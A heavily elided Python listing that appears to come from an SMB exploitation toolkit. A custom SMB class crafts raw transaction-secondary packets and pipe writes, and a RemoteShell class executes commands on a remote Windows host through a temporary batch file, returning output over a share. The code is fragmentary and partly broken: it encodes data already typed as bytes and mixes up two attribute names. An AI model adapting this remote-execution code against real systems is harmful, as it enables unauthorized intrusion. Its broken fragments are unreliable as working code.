...
def _put_trans_data(transCmd, parameters, data, noPad=False):
    ...
    if len(data):
        ...
        if isinstance(data, bytes):
            ...
            transData += (b"\x00" * padLen) + data.encode()
...
class MYSMB(smb.SMB):
    ...
    def get_smbconnection(self):
        if self._smbConn is None:
            self.smbConn = smbconnection.SMBConnection(
                self.get_remote_host(), self.get_remote_host(), existingConnection=self
            )
        return self.smbConn
    ...
    def login_standard(
        self, user, password, domain="", lmhash="", nthash="", maxBufferSize=None
    ):
        _setup_login_packet_hook(maxBufferSize)
    ...
    def connect_tree(
        self, path, password=None, service=smb.SERVICE_ANY, smb_packet=None
    ):
        self._last_tid = smb.SMB.tree_connect_andx(
    ...
    def nt_create_andx(
        ...
        smb_packet=None,
        cmd=None,
        shareAccessMode=smb.FILE_SHARE_READ | smb.FILE_SHARE_WRITE,
        disposition=smb.FILE_OPEN,
        accessMask=0x2019F,
    ):
        self._last_fid = smb.SMB.nt_create_andx(
            self,
            tid,
            filename,
            smb_packet,
    ...
    def do_write_andx_raw_pipe(self, fid, data, mid=None, pid=None, tid=None):
        ...
        writeAndX["Parameters"]["DataOffset"] = (
            32 + len(writeAndX["Parameters"]) + 1 + 2 + 1
        )
        if isinstance(data, bytes):
    ...
    def create_trans_secondary_packet(
        self,
        mid,
        param="",
        paramDisplacement=0,
    ...
    def send_trans_secondary(
        ...
        self.send_raw(
            self.create_trans_secondary_packet(
                mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad
            )
        )
    ...
    def send_nt_trans_secondary(
        ...
        self.send_raw(
            self.create_nt_trans_secondary_packet(
                mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad
            )
        )
...
class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        ...
        self.__share = share
        self.__mode = mode
        self.__outputFilename = "".join(
            [random.choice(string.ascii_letters) for _ in range(4)]
        )
        self.__output = "\\\\%COMPUTERNAME%\\{}\\{}".format(
            self.__share, self.__outputFilename
        )
        self.__batchFile = "%TEMP%\\{}.bat".format(
    ...
    def do_cd(self, s):
        ...
        if len(self.__outputBuffer) > 0:
            self.prompt = (
                self.__outputBuffer.decode(errors="replace").replace("\r\n", "") + ">"
            )
            self.__outputBuffer = b""
    ...
    def get_output(self):
        ...
        if self.__mode == "SHARE":
            self.transferClient.getFile(
                self.__share, self.__outputFilename, output_callback
            )
